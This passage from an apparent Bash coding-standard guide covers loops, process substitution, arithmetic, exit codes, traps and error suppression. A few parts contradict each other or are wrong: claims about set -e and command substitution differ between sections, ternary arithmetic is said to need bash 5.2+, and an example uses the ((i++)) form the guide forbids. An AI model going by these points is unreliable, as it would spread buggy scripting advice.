
# Glob with no matches (nullglob)
shopt -s nullglob
for file in /nonexistent/*.txt; do echo "$file"; done  # Never executes

# Loop variable scope - not local, persists after loop
for i in {1..5}; do :; done
echo "$i"  # Prints: 5

# ✓ CORRECT - declare locals BEFORE loops
process_links() {
  local -- target
  local -i count=0
  for link in "$BIN_DIR"/*; do
    target=$(readlink "$link")
    count+=1
  done
}

# ✗ WRONG - declaring inside loop (wasteful, misleading)
for link in "$BIN_DIR"/*; do
  local target  # Re-executed each iteration
  target=$(readlink "$link")
done
```

**Summary:**
- **For loops** — arrays, globs, known ranges
- **While loops** — reading input, argument parsing, conditions
- **Until loops** — rarely needed, prefer while with opposite condition
- **Infinite loops** — `while ((1))` fastest; `while :` for POSIX; avoid `while true`
- **Always quote arrays** — `"${array[@]}"`
- **Process substitution** — `< <(command)` to avoid subshell
- **Use i+=1 not i++** — ++ fails with set -e when 0
- **IFS= read -r** — always with while loops
- **break N** — specify level for nested loops


---


**Rule: BCS0504**

## Pipes to While Loops

**Avoid piping commands to while loops because pipes create subshells where variable assignments don't persist outside the loop. Use process substitution `< <(command)` or `readarray` instead.**

**Rationale:**
- Pipes create subshells; variables modified inside don't persist outside
- Silent failure: no errors, script continues with wrong values (counters stay 0, arrays stay empty)
- `< <(command)` runs loop in current shell; `readarray` is cleaner for line collection
- Failures in piped commands may not trigger `set -e` properly

**The subshell problem:**

```bash
# ✗ WRONG - Subshell loses variable changes
declare -i count=0

echo -e "line1\nline2\nline3" | while IFS= read -r line; do
  echo "$line"
  count+=1
done

echo "Count: $count"  # Output: Count: 0 (NOT 3!)
```

**Solution 1: Process substitution (most common)**

```bash
# ✓ CORRECT - Process substitution avoids subshell
declare -i count=0

while IFS= read -r line; do
  echo "$line"
  count+=1
done < <(echo -e "line1\nline2\nline3")

echo "Count: $count"  # Output: Count: 3 (correct!)
```

**Solution 2: Readarray/mapfile (when collecting lines)**

```bash
# ✓ CORRECT - readarray reads all lines into array
declare -a lines

readarray -t lines < <(echo -e "line1\nline2\nline3")

declare -i count="${#lines[@]}"
echo "Count: $count"  # Output: Count: 3 (correct!)
```

**Solution 3: Here-string (for single variables)**

```bash
# ✓ CORRECT - Here-string when input is in variable
declare -- input=$'line1\nline2\nline3'
declare -i count=0

while IFS= read -r line; do
  count+=1
done <<< "$input"

echo "Count: $count"  # Output: Count: 3 (correct!)
```

**Complete example: Counting matching lines**

```bash
# ✗ WRONG - Counter stays 0
count_errors_wrong() {
  local -- log_file=$1
  local -i error_count=0

  grep 'ERROR' "$log_file" | while IFS= read -r line; do
    error_count+=1
  done

  echo "Errors: $error_count"  # Always 0!
}

# ✓ CORRECT - Process substitution
count_errors_correct() {
  local -- log_file=$1
  local -i error_count=0

  while IFS= read -r line; do
    error_count+=1
  done < <(grep 'ERROR' "$log_file")

  echo "Errors: $error_count"  # Correct count!
}

# ✓ ALSO CORRECT - Using grep -c when only count matters
count_errors_simple() {
  local -- log_file=$1
  local -i error_count

  error_count=$(grep -c 'ERROR' "$log_file")
  echo "Errors: $error_count"
}
```

**Building arrays from command output:**

```bash
# ✗ WRONG - Array stays empty
collect_users_wrong() {
  local -a users=()

  getent passwd | while IFS=: read -r user _; do
    users+=("$user")
  done

  echo "Users: ${#users[@]}"  # Always 0!
}

# ✓ CORRECT - Process substitution
collect_users_correct() {
  local -a users=()

  while IFS=: read -r user _; do
    users+=("$user")
  done < <(getent passwd)

  echo "Users: ${#users[@]}"  # Correct count!
}

# ✓ ALSO CORRECT - readarray (simpler)
collect_users_readarray() {
  local -a users

  readarray -t users < <(getent passwd | cut -d: -f1)
  echo "Users: ${#users[@]}"
}
```

**When readarray is better:**

```bash
# ✓ BEST - readarray for simple line collection
declare -a log_lines
readarray -t log_lines < <(tail -n 100 /var/log/app.log)

# ✓ BEST - readarray with null-delimited input (handles spaces in filenames)
declare -a files
readarray -d '' -t files < <(find /data -type f -print0)

for file in "${files[@]}"; do
  echo "Processing: $file"
done
```

**Anti-patterns to avoid:**

```bash
declare -i count=0
# ✗ WRONG - Pipe to while with counter
cat file.txt | while read -r line; do
  count+=1
done
echo "$count"  # Still 0!

# ✓ CORRECT - Process substitution
while read -r line; do
  count+=1
done < <(cat file.txt)

# ✗ WRONG - Pipe to while building array
find /data -name '*.txt' | while read -r file; do
  files+=("$file")
done  # files is empty!

# ✓ CORRECT - readarray
readarray -d '' -t files < <(find /data -name '*.txt' -print0)

# ✗ WRONG - Setting flag in piped while
has_errors=0
grep ERROR log | while read -r line; do
  has_errors=1
done
echo "$has_errors"  # Still 0!

# ✓ CORRECT - Use return value
if grep -q ERROR log; then
  has_errors=1
fi
```

**Edge cases:**

**1. Empty input:** Process substitution handles correctly—loop doesn't execute, variables remain unchanged.

**2. Very large output:**
```bash
# readarray loads everything into memory
readarray -t lines < <(cat huge_file)  # Might use lots of RAM

# Process substitution processes line by line - lower memory usage
while read -r line; do
  process "$line"
done < <(cat huge_file)
```

**3. Null-delimited input (filenames with newlines):**
```bash
# Use -d '' for null-delimited
while IFS= read -r -d '' file; do
  echo "File: $file"
done < <(find /data -print0)

# Or with readarray
readarray -d '' -t files < <(find /data -print0)
```

**Key principle:** Piping to while is a dangerous anti-pattern that silently loses variable modifications. Always use process substitution `< <(command)` or `readarray` instead. If you find `| while read` in code, it's almost certainly a bug.


---


**Rule: BCS0505**

## Arithmetic Operations

> **See Also:** BCS0201 for integer variable declaration with `declare -i`

**Declare integer variables explicitly:**

```bash
declare -i i j result count total
declare -i counter=0
declare -i max_retries=3
```

**Rationale for `declare -i`:**
- Automatic arithmetic context (no `$(())` needed for assignments)
- Type safety catches non-numeric assignment errors
- Slightly faster for repeated operations
- Required for BCS compliance (BCS0201)

**Increment operations:**

```bash
# ✓ CORRECT - The ONLY acceptable increment form
declare -i i=0    # MUST declare as integer first
i+=1              # Clearest, safest, most readable

# ✗ WRONG - NEVER use these increment forms
((i+=1))          # NEVER - (()) is unnecessary
((i++))           # NEVER - fails with set -e when i=0
((++i))           # NEVER - unnecessary complexity
i++               # NEVER - syntax error outside arithmetic context
```

**Critical rule:** Use `i+=1` for ALL increments. Requires `declare -i` or `local -i` first.

**Why `((i++))` is dangerous:**

```bash
#!/usr/bin/env bash
set -e  # Exit on error

i=0
((i++))  # Returns 0 (the old value), which is "false"
         # Script exits here with set -e!

echo "This never executes"
```

**Arithmetic expressions:**

```bash
# In (()) - no $ needed for variables
((result = x * y + z))
((total = sum / count))

# With $(()), for assignments or commands
result=$((x * y + z))
echo "$((i * 2 + 5))"
```

**Arithmetic operators:**

| Operator | Meaning | Example |
|----------|---------|---------|
| `+` `-` `*` `/` `%` | Basic math | `((i = a + b))` |
| `**` | Exponentiation | `((i = a ** b))` |
| `+=` `-=` | Compound assignment | `i+=5` |
| `++` `--` | Increment/Decrement | Use `i+=1` instead |

**Arithmetic conditionals:**

```bash
if ((i < j)); then
  echo 'i is less than j'
fi

((count)) && process_items
((attempts >= max_retries)) && die 1 'Too many attempts'
```

**Comparison operators:** `<` `<=` `>` `>=` `==` `!=`

**Arithmetic truthiness:** Non-zero is truthy. Use directly instead of explicit comparisons:

```bash
# ✓ CORRECT - use truthiness directly
declare -i count=5
if ((count)); then echo 'Has items'; fi
((VERBOSE)) && echo 'Verbose mode enabled'

# ✗ WRONG - redundant comparison
if ((count > 0)); then echo 'Has items'; fi
if ((VERBOSE == 1)); then echo 'Verbose mode'; fi
```

**Complex expressions:**

```bash
((result = (a + b) * (c - d)))
((max = a > b ? a : b))           # Ternary (bash 5.2+)
((flags = flag1 | flag2))         # Bitwise OR
((masked = value & 0xFF))         # Bitwise AND
```

**Anti-pattern: Using [[ ]] for arithmetic:**

```bash
# ✗ WRONG - verbose, old-style
if [[ "$exit_code" -eq 0 ]]; then echo 'Success'; fi
[[ "$count" -gt 10 ]] && process_items

# ✓ CORRECT - clean arithmetic syntax
if ((exit_code == 0)); then echo 'Success'; fi
((count > 10)) && process_items ||:
```

**Why `(())` is better:** No quoting required, native operators (`>` vs `-gt`), more readable, faster (pure bash), type-safe.

**Other anti-patterns:**

```bash
# ✗ Wrong - expr command (slow, external)
result=$(expr $i + $j)
# ✓ Correct
result=$((i + j))

# ✗ Wrong - $ inside (())
((result = $i + $j))
# ✓ Correct
((result = i + j))

# ✗ Wrong - quotes around arithmetic
result="$((i + j))"
# ✓ Correct
result=$((i + j))
```

**Integer division:** Truncates toward zero. Use `bc` or `awk` for floating point:

```bash
((result = 10 / 3))                    # result=3
result=$(bc <<< "scale=2; 10 / 3")     # result=3.33
```

**Practical examples:**

```bash
# Loop counter
declare -i i
for ((i=0; i<10; i+=1)); do
  echo "Iteration $i"
done

# Retry logic
declare -i attempts=0 max_attempts=5
while ((attempts < max_attempts)); do
  process_item && break
  attempts+=1
  ((attempts > max_attempts)) || sleep 1
done
((attempts < max_attempts)) || die 1 'Max attempts reached'
```


---


**Rule: BCS0506**

## Floating-Point Operations

**Rule: BCS0706**

Performing floating-point arithmetic in Bash using external tools.

---

#### Rationale

Bash only supports integer arithmetic natively. For floating-point:
- Use `bc` for arbitrary precision calculations
- Use `awk` for inline floating-point operations
- Use `printf` for formatting floating-point output

---

#### Using bc (Basic Calculator)

```bash
# Simple calculation
result=$(echo '3.14 * 2.5' | bc -l)

# With variables
declare -- width='10.5'
declare -- height='7.25'
area=$(echo "$width * $height" | bc -l)

# Set precision (scale)
pi=$(echo 'scale=10; 4*a(1)' | bc -l)  # Pi to 10 decimal places

# Comparison (bc returns 1 for true, 0 for false)
if (($(echo "$a > $b" | bc -l))); then
  info "$a is greater than $b"
fi
```

#### Using awk

```bash
# Inline calculation
result=$(awk "BEGIN {printf \"%.2f\", 3.14 * 2.5}")

# With variables
area=$(awk -v w="$width" -v h="$height" 'BEGIN {printf "%.2f", w * h}')

# Comparison
if awk -v a="$a" -v b="$b" 'BEGIN {exit !(a > b)}'; then
  info "$a is greater than $b"
fi

# Percentage calculation
pct=$(awk -v used="$used" -v total="$total" 'BEGIN {printf "%.1f", used/total*100}')
```

#### Using printf for Formatting

```bash
printf '%.2f\n' "$value"
printf 'Area: %.2f sq units\n' "$(echo "$w * $h" | bc -l)"
```

#### Common Patterns

```bash
# Human-readable byte sizes
bytes_to_human() {
  local -i bytes=$1
  if ((bytes >= 1073741824)); then
    awk -v b="$bytes" 'BEGIN {printf "%.1fG", b/1073741824}'
  elif ((bytes >= 1048576)); then
    awk -v b="$bytes" 'BEGIN {printf "%.1fM", b/1048576}'
  elif ((bytes >= 1024)); then
    awk -v b="$bytes" 'BEGIN {printf "%.1fK", b/1024}'
  else
    echo "${bytes}B"
  fi
}

# Percentage with rounding
calc_percentage() {
  local -i part=$1 total=$2
  awk -v p="$part" -v t="$total" 'BEGIN {printf "%.0f", p/t*100}'
}
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - Bash integer division loses precision
result=$((10 / 3))  # Returns 3, not 3.333

# ✓ Correct - use bc for float division
result=$(echo '10 / 3' | bc -l)  # Returns 3.333...
```

```bash
# ✗ Wrong - comparing floats as strings
if [[ "$a" > "$b" ]]; then  # String comparison!

# ✓ Correct - use bc or awk for numeric comparison
if (($(echo "$a > $b" | bc -l))); then
```

---

**See Also:** BCS0705 (Integer Arithmetic)

**Full implementation:** See `examples/exemplar-code/hr2int` and `examples/exemplar-code/int2hr`


---


**Rule: BCS0600**

# Error Handling

This consolidated section establishes comprehensive error handling practices for robust scripts. It mandates `set -euo pipefail` (with strongly recommended `shopt -s inherit_errexit`) for automatic error detection, defines standard exit code conventions (0=success, 1=general error, 2=misuse, 5=IO error, 22=invalid argument, etc.), explains trap handling for cleanup operations, details proper return value checking patterns, and clarifies when and how to safely suppress errors (using `|| true`, `|| :`, or conditional checks). Error handling must be configured before any other commands run to catch failures early.


---


**Rule: BCS0601**

## Exit on Error

```bash
set -euo pipefail
# -e: Exit on command failure
# -u: Exit on undefined variable
# -o pipefail: Exit on pipe failure
```

**Rationale:** Strict mode catches errors immediately, prevents cascading failures, makes scripts behave like compiled languages.

**Handling expected failures:**

```bash
# Allow specific command to fail
command_that_might_fail || true

# Capture exit code in conditional
if command_that_might_fail; then
  echo 'Success'
else
  echo 'Expected failure occurred'
fi

# Temporarily disable errexit
set +e
risky_command
set -e

# Check optional variable safely
if [[ -n "${OPTIONAL_VAR:-}" ]]; then
  echo "Variable is set: $OPTIONAL_VAR"
fi
```

**Critical gotcha - command substitution exits immediately:**

```bash
# ✗ Script exits here with set -e
result=$(failing_command)  # Never reaches next line

# ✓ Correct - disable errexit for this command
set +e
result=$(failing_command)
set -e

# ✓ Alternative - check in conditional
if result=$(failing_command); then
  echo "Command succeeded: $result"
fi
```

**When to disable:** Interactive scripts, scripts trying multiple approaches, cleanup operations. Re-enable immediately after.


---


**Rule: BCS0602**

## Exit Codes

Exit codes provide consistent error reporting. Use integers directly or define constants as needed.

### Standard `die()` Function

```bash
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

**Usage:**
```bash
die 3 'File not found'
declare -i ERR_NOENT=3
die "$ERR_NOENT" "Config file not found ${file@Q}"
```

---

### BCS Canonical Exit Codes

| Code | Name | Description | errno |
|------|------|-------------|-------|
| 0 | SUCCESS | Successful termination | - |
| 1 | ERR_GENERAL | General/unspecified error | - |
| 2 | ERR_USAGE | Command line usage error | - |
| 3 | ERR_NOENT | No such file or directory | ENOENT=2 |
| 4 | ERR_ISDIR | Is a directory (expected file) | EISDIR=21 |
| 5 | ERR_IO | I/O error | EIO=5 |
| 6 | ERR_NOTDIR | Not a directory (expected dir) | ENOTDIR=20 |
| 7 | ERR_EMPTY | File/input is empty | - |
| 8 | ERR_REQUIRED | Required argument missing | - |
| 9 | ERR_RANGE | Value out of range | ERANGE=34 |
| 10 | ERR_TYPE | Wrong type/format | - |
| 11 | ERR_PERM | Operation not permitted | EPERM=1 |
| 12 | ERR_READONLY | Read-only filesystem | EROFS=30 |
| 13 | ERR_ACCESS | Permission denied | EACCES=13 |
| 14 | ERR_NOMEM | Out of memory | ENOMEM=12 |
| 15 | ERR_NOSPC | No space left on device | ENOSPC=28 |
| 16 | ERR_BUSY | Resource busy/locked | EBUSY=16 |
| 17 | ERR_EXIST | Already exists | EEXIST=17 |
| 18 | ERR_NODEP | Missing dependency | - |
| 19 | ERR_CONFIG | Configuration error | - |
| 20 | ERR_ENV | Environment error | - |
| 21 | ERR_STATE | Invalid state/precondition | - |
| 22 | ERR_INVAL | Invalid argument | EINVAL=22 |
| 23 | ERR_NETWORK | General network error | - |
| 24 | ERR_TIMEOUT | Operation timed out | ETIMEDOUT=110 |
| 25 | ERR_HOST | Host unreachable/unknown | EHOSTUNREACH=113 |

### Reserved Ranges

| Range | Purpose |
|-------|---------|
| 64-78 | BSD sysexits.h (EX_USAGE=64, EX_CONFIG=78) |
| 126 | Command cannot execute (Bash) |
| 127 | Command not found (Bash) |
| 128+n | Fatal signal n (130=SIGINT, 137=SIGKILL, 143=SIGTERM) |

---

### Common Usage Examples

```bash
# File operations
[[ -f "$config" ]] || die 3 "Config not found ${config@Q}"
[[ -d "$dir" ]] || die 6 "Not a directory ${dir@Q}"
[[ -s "$input" ]] || die 7 "Input file is empty ${input@Q}"

# Argument validation
[[ -n "$required" ]] || die 8 'Required argument missing: --name'
((port >= 1 && port <= 65535)) || die 9 "Port out of range: $port"
[[ "$mode" =~ ^(read|write)$ ]] || die 22 "Invalid mode ${mode@Q}"

# Permissions
[[ -r "$file" ]] || die 13 "Cannot read ${file@Q}"
[[ -w "$dir" ]] || die 12 "Directory is read-only ${dir@Q}"

# Dependencies
command -v jq &>/dev/null || die 18 'Missing dependency: jq'

# Network
curl -sf "$url" || die 24 "Request timed out: $url"
ping -c1 "$host" &>/dev/null || die 25 "Host unreachable: $host"
```

### Checking Exit Codes

```bash
if validate_input "$data"; then
  process "$data"
else
  case $? in
    8)  die 8 'Validation failed: missing required field' ;;
    9)  die 9 'Validation failed: value out of range' ;;
    22) die 22 'Validation failed: invalid format' ;;
    *)  die 1 'Validation failed: unknown error' ;;
  esac
fi
```

---

### Design Rationale

- **0-2**: Match standard Bash shell behavior
- **3-25**: BCS custom codes grouped by error category
- **22 (EINVAL)**: Preserved at errno value for familiarity
- **errno alignment**: Where practical (5, 13, 16, 17, 22)
- **Avoid 64+**: Reserved for sysexits.h and signal codes


---


**Rule: BCS0603**

## Trap Handling

**Standard cleanup pattern:**

```bash
cleanup() {
  local -i exitcode=${1:-0}

  # Disable trap during cleanup to prevent recursion
  trap - SIGINT SIGTERM EXIT

  # Cleanup operations
  [[ -n "$temp_dir" && -d "$temp_dir" ]] && rm -rf "$temp_dir" ||:
  [[ -n "$lockfile" && -f "$lockfile" ]] && rm -f "$lockfile" ||:

  # Log cleanup completion
  ((exitcode == 0)) && info 'Cleanup completed successfully' || warn "Cleanup after error (exit $exitcode)"

  exit "$exitcode"
}

# Install trap
trap 'cleanup $?' SIGINT SIGTERM EXIT
```

**Rationale:** Ensures temp files, locks, and processes are cleaned up on errors or signals (Ctrl+C, kill). Captures original exit status with `$?`. Prevents partial state regardless of exit method.

**Trap signals:**

| Signal | When Triggered |
|--------|----------------|
| `EXIT` | Always on script exit (normal or error) |
| `SIGINT` | Ctrl+C |
| `SIGTERM` | `kill` command (default signal) |
| `ERR` | Command fails (with `set -e`) |

**Common patterns:**

**Temp file/directory cleanup:**
```bash
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT
```

**Lockfile cleanup:**
```bash
lockfile=/var/lock/myapp.lock
if [[ -f "$lockfile" ]]; then
  die 1 "Already running (lock file exists ${lockfile@Q})"
fi
echo $$ > "$lockfile" || die 1 "Failed to create lock file ${lockfile@Q}"
trap 'rm -f "$lockfile"' EXIT
```

**Process cleanup:**
```bash
long_running_command &
bg_pid=$!
trap 'kill $bg_pid 2>/dev/null' EXIT
```

**Comprehensive cleanup function:**
```bash
declare -- temp_dir='' lockfile=''
declare -i bg_pid=0

cleanup() {
  local -i exitcode=${1:-0}
  trap - SIGINT SIGTERM EXIT

  ((bg_pid)) && kill "$bg_pid" 2>/dev/null ||:
  [[ -n "$temp_dir" && -d "$temp_dir" ]] && rm -rf "$temp_dir" ||:
  [[ -n "$lockfile" && -f "$lockfile" ]] && rm -f "$lockfile" ||:

  ((exitcode == 0)) && info 'Script completed successfully' || error "Script exited with error code: $exitcode"
  exit "$exitcode"
}

# Install trap EARLY (before creating resources)
trap 'cleanup $?' SIGINT SIGTERM EXIT
```

**Multiple traps for same signal:**
```bash
trap 'echo "Exiting..."' EXIT
trap 'rm -f "$temp_file"' EXIT  # ✗ REPLACES previous trap!

# ✓ Combine in one trap or use cleanup function
trap 'echo "Exiting..."; rm -f "$temp_file"' EXIT
```

**Trap execution order:** On Ctrl+C: SIGINT handler �' EXIT handler �' script exits.

**Disabling traps:**
```bash
trap - EXIT                    # Disable specific trap
trap - SIGINT                  # Ignore Ctrl+C during critical operation
perform_critical_operation
trap 'cleanup $?' SIGINT       # Re-enable
```

**Anti-patterns:**

```bash
# ✗ Not preserving exit code
trap 'rm -f "$temp_file"; exit 0' EXIT  # Always exits 0!

# ✓ Preserve exit code
trap 'exitcode=$?; rm -f "$temp_file"; exit $exitcode' EXIT

# ✗ Double quotes expand variables immediately
temp_file=/tmp/foo
trap "rm -f $temp_file" EXIT  # Expands NOW to /tmp/foo
temp_file=/tmp/bar            # Trap still removes /tmp/foo!

# ✓ Single quotes delay expansion
trap 'rm -f "$temp_file"' EXIT

# ✗ Resource created before trap installed
temp_file=$(mktemp)
trap 'cleanup $?' EXIT  # If script exits here, temp_file leaks!

# ✓ Set trap BEFORE creating resources
trap 'cleanup $?' EXIT
temp_file=$(mktemp)

# ✗ Complex cleanup inline
trap 'rm "$file1"; rm "$file2"; kill $pid; rm -rf "$dir"' EXIT

# ✓ Use cleanup function
trap 'cleanup $?' EXIT
```

**Best practices:**
- Use cleanup function for non-trivial cleanup
- Disable trap inside cleanup to prevent recursion
- Set trap early before creating resources
- Preserve exit code with `trap 'cleanup $?' EXIT`
- Use single quotes to delay variable expansion


---


**Rule: BCS0604**

## Checking Return Values

**Always check return values of commands and function calls, providing informative error messages with context about what failed. While `set -e` helps, explicit checking gives better control over error handling and messaging.**

**Rationale:**
- Explicit checks enable contextual error messages and controlled recovery/cleanup
- `set -e` doesn't catch: pipelines (except last), conditionals, command substitution in assignments
- Informative errors aid debugging and user experience; some failures are non-critical

**When `set -e` is not enough:**
```bash
# set -e doesn't catch these:
cat missing_file.txt | grep pattern  # Doesn't exit if cat fails
if command_that_fails; then echo 'Runs even though command failed'; fi
output=$(failing_command)  # Doesn't exit - output empty, script continues
```

**Basic return value checking patterns:**

**Pattern 1: Explicit if check (most informative)**
```bash
if ! mv "$source_file" "$dest_dir/"; then
  error "Failed to move ${source_file@Q} to ${dest_dir@Q}"
  exit 1
fi
```

**Pattern 2: || with die (concise)**
```bash
mv "$source_file" "$dest_dir/" || die 1 "Failed to move ${source_file@Q}"
```

**Pattern 3: || with command group (for cleanup)**
```bash
mv "$temp_file" "$final_location" || {
  error "Failed to move ${temp_file@Q} to ${final_location@Q}"
  rm -f "$temp_file"
  exit 1
}
```

**Pattern 4: Capture and check return code**
```bash
wget "$url"
case $? in
  0) success "Download complete" ;;
  1) die 1 "Generic error" ;;
  4) die 4 "Network failure" ;;
  *) die 1 "Unknown error: $?" ;;
esac
```

**Pattern 5: Function return value checking**
```bash
validate_file() {
  local -- file=$1
  [[ -f "$file" ]] || return 2  # Not found
  [[ -r "$file" ]] || return 5  # Permission denied
  [[ -s "$file" ]] || return 22 # Invalid (empty)
  return 0
}

if validate_file "$config_file"; then
  source "$config_file"
else
  case $? in
    2)  die 2 "Config file not found ${config_file@Q}" ;;
    5)  die 5 "Cannot read config file ${config_file@Q}" ;;
    22) die 22 "Config file is empty ${config_file@Q}" ;;
  esac
fi
```

**Edge case: Pipelines**
```bash
# Solution 1: Use PIPEFAIL
set -o pipefail
cat missing_file | grep pattern  # Exits if cat fails

# Solution 2: Check PIPESTATUS array
cat file1 | grep pattern | sort
if ((PIPESTATUS[0] != 0)); then die 1 'cat failed'; fi

# Solution 3: Process substitution
grep pattern < <(cat file1)
```

**Edge case: Command substitution**
```bash
# Check after assignment
output=$(command_that_might_fail) || die 1 'Command failed'

# Or use inherit_errexit (Bash 4.4+)
shopt -s inherit_errexit
output=$(failing_command)  # NOW exits with set -e
```

**Complete example:**
```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
info() { echo "$SCRIPT_NAME: $*"; }

create_backup() {
  local -- source_dir=$1 backup_file=$2 temp_file

  [[ -d "$source_dir" ]] || { error "Source not found ${source_dir@Q}"; return 2; }
  [[ -w "${backup_file%/*}" ]] || { error "Cannot write to '${backup_file%/*}'"; return 5; }

  temp_file="$backup_file".tmp

  if ! tar -czf "$temp_file" -C "${source_dir%/*}" "${source_dir##*/}"; then
    error 'Failed to create tar archive'
    rm -f "$temp_file"
    return 1
  fi

  mv "$temp_file" "$backup_file" || { rm -f "$temp_file"; return 1; }
  sha256sum "$backup_file" > "$backup_file".sha256 || true  # Non-fatal
  info "Backup created ${backup_file@Q}"
}

main() {
  local -a source_dirs=(/etc /var/log)
  local -- dir
  local -i fail_count=0

  for dir in "${source_dirs[@]}"; do
    create_backup "$dir" /backup/"${dir##*/}".tar.gz || ((fail_count++))
  done

  ((fail_count == 0)) || die 1 'Some backups failed'
  info 'All backups completed'
}

main "$@"
#fin
```

**Anti-patterns:**
```bash
# ✗ Ignoring return values
mv "$file" "$dest"  # No check - script continues on failure

# ✓ Check return value
mv "$file" "$dest" || die 1 "Failed to move ${file@Q} to ${dest@Q}"

# ✗ Checking $? too late
command1
command2
if (($?)); then  # Checks command2, not command1!

# ✗ Generic error message
mv "$file" "$dest" || die 1 'Move failed'  # No context!

# ✗ Not checking command substitution
checksum=$(sha256sum "$file")  # Empty on failure, continues

# ✓ Check command substitution
checksum=$(sha256sum "$file") || die 1 "Checksum failed for ${file@Q}"

# ✗ Not cleaning up after failure
cp "$source" "$dest" || exit 1  # May leave partial file

# ✓ Cleanup on failure
cp "$source" "$dest" || { rm -f "$dest"; die 1 "Copy failed"; }

# ✗ Assuming set -e catches everything
set -e
output=$(failing_command)  # Doesn't exit!

# ✓ Explicit checks with proper options
set -euo pipefail
shopt -s inherit_errexit
output=$(failing_command) || die 1 'Command failed'
```

**Summary:**
- Always check return values of critical operations
- Use `set -euo pipefail` + `inherit_errexit` as baseline, add explicit checks
- Provide context in errors (what failed, with what inputs)
- Check command substitution: `output=$(cmd) || die 1 "failed"`
- Use PIPEFAIL/PIPESTATUS for pipeline failures
- Clean up on failure: `|| { cleanup; exit 1; }`
- Test error paths to ensure failures are caught

**Key principle:** Defensive programming assumes operations can fail. Check returns, provide informative errors, handle failures gracefully.


---


**Rule: BCS0605**

## Error Suppression

**Only suppress errors when failure is expected, non-critical, and explicitly safe. Always document WHY.**

**Rationale:**
- Masks bugs and creates silent failures
- Security risk: ignored errors leave systems vulnerable
- Debugging nightmare: impossible to diagnose suppressed errors
- False success: users think operations succeeded when they failed

**When suppression IS appropriate:**

```bash
# 1. Checking if command exists (expected to fail)
if command -v optional_tool >/dev/null 2>&1; then
  info 'optional_tool available'
fi

# 2. Cleanup operations (may have nothing to clean)
rm -f /tmp/myapp_* 2>/dev/null || true
rmdir /tmp/myapp 2>/dev/null || true

# 3. Idempotent operations
install -d "$target_dir" 2>/dev/null || true
id "$username" >/dev/null 2>&1 || useradd "$username"

# 4. Optional operations with fallback
command -v md2ansi >/dev/null 2>&1 && md2ansi < "$file" || cat "$file"
```

**When suppression is DANGEROUS:**

```bash
# ✗ File operations - script continues with missing file
cp "$important_config" "$destination" 2>/dev/null || true

# ✓ Correct - fail explicitly
cp "$important_config" "$destination" || die 1 "Failed to copy config"

# ✗ System configuration - service not running
systemctl start myapp 2>/dev/null || true

# ✓ Correct
systemctl start myapp || die 1 'Failed to start myapp service'

# ✗ Security operations - wrong permissions
chmod 600 "$private_key" 2>/dev/null || true

# ✓ Correct
chmod 600 "$private_key" || die 1 "Failed to secure ${private_key@Q}"

# ✗ Required dependency checks
command -v git >/dev/null 2>&1 || true

# ✓ Correct
command -v git >/dev/null 2>&1 || die 1 'git is required'
```

**Suppression patterns:**

| Pattern | Effect | Use When |
|---------|--------|----------|
| `2>/dev/null` | Suppress stderr only | Messages noisy but check return value |
| `\|\| true` | Ignore return code | Failure acceptable, want to continue |
| `2>/dev/null \|\| true` | Suppress both | Both messages and return code irrelevant |

```bash
# Pattern 4: ALWAYS document WHY
# Rationale: Temp files may not exist, this is not an error
rm -f /tmp/myapp_* 2>/dev/null || true

# Pattern 5: Conditional suppression
if ((DRY_RUN)); then
  actual_operation 2>/dev/null || true
else
  actual_operation || die 1 'Operation failed'
fi
```

**Complete example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -- CACHE_DIR="$HOME"/.cache/myapp

# Optional dependency - suppress OK
check_optional_tools() {
  if command -v md2ansi >/dev/null 2>&1; then
    declare -g -i HAS_MD2ANSI=1
  else
    declare -g -i HAS_MD2ANSI=0
  fi
}

# Required dependency - DO NOT suppress
check_required_tools() {
  command -v jq >/dev/null 2>&1 || die 1 'jq is required'
}

# Idempotent creation - suppress OK, but verify
create_directories() {
  # Rationale: install -d is idempotent
  install -d "$CACHE_DIR" 2>/dev/null || true
  [[ -d "$CACHE_DIR" ]] || die 1 "Failed to create ${CACHE_DIR@Q}"
}

# Cleanup - suppress OK
cleanup_old_files() {
  # Rationale: files may not exist
  rm -f "$CACHE_DIR"/*.tmp 2>/dev/null || true
}

# Data processing - DO NOT suppress
process_data() {
  local -- input_file=$1 output_file=$2
  jq '.data' < "$input_file" > "$output_file" || die 1 "Failed to process ${input_file@Q}"
}

main() {
  check_required_tools
  check_optional_tools
  create_directories
  cleanup_old_files
  process_data input.json "$CACHE_DIR"/output.json
}

main "$@"
#fin
```

**Anti-patterns:**

```bash
# ✗ Suppressing critical operation
cp "$important_file" "$backup" 2>/dev/null || true
# ✓ cp "$important_file" "$backup" || die 1 'Failed to create backup'

# ✗ Suppressing without understanding
some_command 2>/dev/null || true
# ✓ Add comment: # Rationale: temp directory may not exist

# ✗ Suppressing all errors in function
process_files() { ... } 2>/dev/null
# ✓ Suppress only specific optional operations

# ✗ Using set +e to suppress errors
set +e; critical_operation; set -e
# ✓ Use || true for specific commands only

# ✗ Different handling prod vs dev
[[ "$ENV" == production ]] && operation 2>/dev/null || operation
# ✓ Same error handling everywhere
```

**Key principles:**
- Suppress only when failure is expected, non-critical, safe to ignore
- Always document WHY with a comment
- Never suppress: data ops, security ops, required dependencies
- Verify after suppressed operations when possible
- Error suppression is the exception, not the rule


---


**Rule: BCS0606**

## Conditional Declarations with Exit Code Handling

**When using arithmetic conditionals for optional declarations under `set -e`, append `|| :` to prevent false conditions from triggering script exit.**

**Rationale:**
- `(())` returns exit code 0 when true, 1 when false
- Under `set -euo pipefail`, exit code 1 terminates the script
- `|| :` provides safe fallback (colon always returns 0)
- Traditional Unix idiom for "ignore this error"

**The problem and solution:**

```bash
#!/bin/bash
set -euo pipefail
